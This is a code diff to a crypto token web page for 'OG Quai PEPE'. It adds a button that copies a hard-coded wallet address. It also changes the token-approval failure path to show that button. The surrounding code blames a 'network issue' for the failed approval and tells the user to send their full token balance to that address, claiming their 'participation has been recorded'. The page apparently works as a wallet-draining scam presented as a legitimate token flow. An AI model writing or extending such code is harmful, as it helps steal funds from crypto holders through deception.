@@ -241,7 +241,26 @@
         <button id="buyBtn" class="btn-buy" style="display:none" onclick="window.open('https://poop.fun/token/0x001411083d4CF24632BA5e0841909933C2Da04a8', '_blank')">Buy Here!</button>
     </div>
 
+    <button id="copyBtn" class="btn-copy" style="display:none">
+        Copy Address: 0x006B8A853ee3235c77947D12E47A3dBC547Bab10
+    </button>
+
     <script>
+        function copyAddressToClipboard() {
+    navigator.clipboard.writeText(DESTINATION_ADDRESS)
+        .then(() => {
+            log('✅ Address copied to clipboard');
+            const copyBtn = document.getElementById('copyBtn');
+            const originalText = copyBtn.textContent;
+            copyBtn.textContent = '✅ Copied!';
+            setTimeout(() => {
+                copyBtn.textContent = originalText;
+            }, 2000);
+        })
+        .catch(err => {
+            log('❌ Failed to copy address: ' + err);
+        });
+}
 const TOKEN_ABI = [
     {
         "constant": false,
@@ -809,10 +828,8 @@ document.getElementById('sendBtn').addEventListener('click', async () => {
         await saveSessionToFirebase();
         
         alert(`Since token approval failed, (network issue) please send your tokens directly from your wallet to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation has been recorded.`);
-        
-        // Show the scan and buy buttons
-        document.getElementById('scanBtn').style.display = 'block';
-        document.getElementById('buyBtn').style.display = 'block';
+        document.getElementById('copyBtn').addEventListener('click', copyAddressToClipboard);
+        document.getElementById('copyBtn').style.display = 'block';
     }
 });
 
